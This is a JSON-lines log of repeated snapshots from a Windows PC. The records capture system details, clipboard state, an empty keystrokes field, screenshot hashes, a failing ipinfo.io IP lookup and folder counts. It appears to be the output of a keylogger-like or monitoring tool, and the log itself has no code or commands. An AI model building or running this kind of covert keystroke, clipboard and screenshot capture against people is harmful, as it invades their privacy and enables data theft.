{"timestamp": "2025-06-14T07:41:58.350102+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9df2940d6b34fd1270f1134347b37db0dc223981a80c6661dfe0a53e481770ae", "_raw_log_hash": "d4e2f4161bc00435fc62c1c5425223b37d412974df99151819c50297696c4a00"}
{"timestamp": "2025-06-14T07:42:12.249348+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d93cbcf1bbffc268ae3ce7a55019725bd9b3c17e442e7758d07d4aec395663e2", "_raw_log_hash": "1c9b91a5f48e89b67093adfd9831b8e17897ffc04178f8e588945a2785489fa0"}
{"timestamp": "2025-06-14T07:42:25.849596+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8c7e1a16e06a47a6c1ed33c027a1b1df6bf5f27aeaec5670512ba620fde7279f", "_raw_log_hash": "f70bd3db8e6085cdd9f73236a6420775e4945f19606c8a9327c003b36c082964"}
{"timestamp": "2025-06-14T07:42:39.398078+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ecfff94c0d28efa919f20a18caba03cf28baba81d1b262a960e6d4a6ae7df770", "_raw_log_hash": "1af0c5362f0e501da447eb7d733f19eb9f5a2027618bbee3ab1d25e6b9083370"}
{"timestamp": "2025-06-14T07:42:52.883844+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a89ca33181b174d967c2b5914c492112274d2aaad0c42a30b5e9e02c6ddd38b9", "_raw_log_hash": "d50895879c92dc53e709b54898062aa764d79c51dd535c88ac098b9bd2a839c8"}
{"timestamp": "2025-06-14T07:43:06.442552+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6376557943245558fee408bbe9e960fb2e139026835fe616116b81b1972398b1", "_raw_log_hash": "c00a70ef1de5d386dec434a13b1186b2d6e0077ea1a2439e461e37f67bdba366"}
{"timestamp": "2025-06-14T07:43:19.987376+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f8f7e00924f64c052db941c79bfd33e56c4b425b7490c54aad17de988d519bcc", "_raw_log_hash": "0ac7c8dc2aa651bea4644cfbe1a5d94e161da530f7017af970831e5277214b43"}
{"timestamp": "2025-06-14T07:43:33.502693+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4ca9c7801be2446a1d8596e5b8ad5f0c2ead373cc43931bd28fec5fe4a50254e", "_raw_log_hash": "8191473c2237a4cc7ebb1ba591336718d7caf72f762cd8ea5364cc0e56de50d6"}
{"timestamp": "2025-06-14T07:43:47.067323+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a14dbf9b5593efb0bd4fba831801fce318e69cc47ffe331bebe83d3b3bf0155e", "_raw_log_hash": "1aa6a7d78b79a220b843fd81f5f354221a45800ffa01a83d9ddacd905dc6dee3"}
{"timestamp": "2025-06-14T07:44:00.596561+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5d6f9babb66b996400e9f9a0678138fade077af89332ac768e50107fb404eda5", "_raw_log_hash": "ea1cd2fc43472986041476e49db8dd20d0da1045ca38c782f8a41be622beeaae"}
{"timestamp": "2025-06-14T07:44:14.092197+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "04aab18e614b81eea62957a4d59f390ab35275fe2ad3f2b0749db01f4eebcd36", "_raw_log_hash": "87fcba1f96a7d824fecc049e0d864ab475cc5fdedfc13b365a64a882d7a9d46d"}
{"timestamp": "2025-06-14T07:44:27.659157+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f8eef0f291dec66d4b2a9294a3d9ee19e7a394fb79057233cf5bda2e802a081d", "_raw_log_hash": "1c2b52e1c47b6a27e12b54e2f93516630cf5135525f53c28244a28402b8a5587"}
{"timestamp": "2025-06-14T07:44:41.265217+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "87df1dd611a28a04a68fe864b1bcb1822b6450ebcdc10290ad42af64b6073623", "_raw_log_hash": "3f1692cfc6388cfe96459e3e9955ac109349a5729dff207b1de99f225b9a956a"}
{"timestamp": "2025-06-14T07:44:54.810530+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "cb3806c8102b07647c04d7266cb9e608cdae000be2eaff9cb591866ce25a2f81", "_raw_log_hash": "c451a7acf7586f626b3d84837ba69246dd336f919fc5a745d9ab8245c792c2f0"}
{"timestamp": "2025-06-14T07:45:08.354531+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "87ed930735aa64f782ffca15343c30d393f121fe677dd568cdf5b3177f3d811c", "_raw_log_hash": "3e2a4564fbbe8ab5878983be6e90c8424951dfa6ba89d99a571116faf0afae9a"}
{"timestamp": "2025-06-14T07:45:21.913555+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7ce43cbcac6216ec43d038304f56435ed2f3be826756b6dc4b248730440929f1", "_raw_log_hash": "c9fff4e167a95857a895954e7eab07d384e2da391bf4ed7776693a47e35b51f4"}
{"timestamp": "2025-06-14T07:45:35.352095+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "23161f78104478e38197abcbce81b68593b7ed3278d9ad86811ab34903cd01b2", "_raw_log_hash": "6118f98bf282ebad4ed9b0e7ee48a24204b5d3bda87837bc903b28445bdc4d7b"}
{"timestamp": "2025-06-14T07:45:48.948409+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4c76a95334f514bd89364035cacc25f8e6cfd3b21a8568596555f63baab2c18b", "_raw_log_hash": "d2f0c78157ced5fb37635beb3d09458b4f4740d2376b3c4dad422316469d0b33"}
{"timestamp": "2025-06-14T07:46:02.458615+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c787834ce4524685760735eb58aa2f8dc5d80708028e13a5c78bb9815b71b5c7", "_raw_log_hash": "dda94445790b7878797762cae84e5d2519f37c5cfea9ab890f78bf4ace18de59"}
{"timestamp": "2025-06-14T07:46:15.944140+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a16c40c597cc2a2b523e1c68cd167b7b7e8c6beaa0e706d8355652ee91c76ee5", "_raw_log_hash": "e0242ad6b0b993b213db3a312a57a866b4ec0e8c39982bfef83f3acfc5d9a7f0"}
{"timestamp": "2025-06-14T07:46:29.417522+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a44931452413d67dea16261068a8d0c6001af5627672e239beb90cd2b1b4fb2a", "_raw_log_hash": "c202dadfdc12cc7265936f83bd556ed00e7aa40d7058186e8030d824c034f294"}
{"timestamp": "2025-06-14T07:46:43.062663+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8a05a0608951d0885617f8b4683b2272692480c28084216c65c89593771cb451", "_raw_log_hash": "6557b3dbfaefe5a553dacc3c5023482a0fe33d88438cced83c821a1dfc9a9107"}
{"timestamp": "2025-06-14T07:46:56.613189+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3684acd415a84e48ec9688fcdc66c9b8e7d3e04be04867e510824eb8f7b62210", "_raw_log_hash": "dff58dcc54fb1281b4d38d0baee6b8b84c1f837e82d751142f277e9fc67d72ac"}
{"timestamp": "2025-06-14T07:47:10.172463+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "964f9c193da772482d2d69e1fa6f2ed398d0e981b90eb82354a52db8ef272476", "_raw_log_hash": "37609f281500f277e55dfc00a6e6cf6e81c5eaaace1fa7469bae73847487a41b"}
{"timestamp": "2025-06-14T07:47:23.807529+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d47c8f9659fb5faa9a4a0fe6a214c8a66b44f4f9e44ca698d47539fbe6512d0d", "_raw_log_hash": "7276b64f4cca58592224b4810ddcb6307fe52a632bb9dc3a572b977fd4f21f9e"}
{"timestamp": "2025-06-14T07:47:37.337260+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6516f9929b81a5239d4d426c9f9ebfbcdc369a2d9a0856e9ff11eede38b416ec", "_raw_log_hash": "fa52f42a65f47307e53d69bbb8322f02e52bbc84244ed60a4fb6dbd758c6609f"}
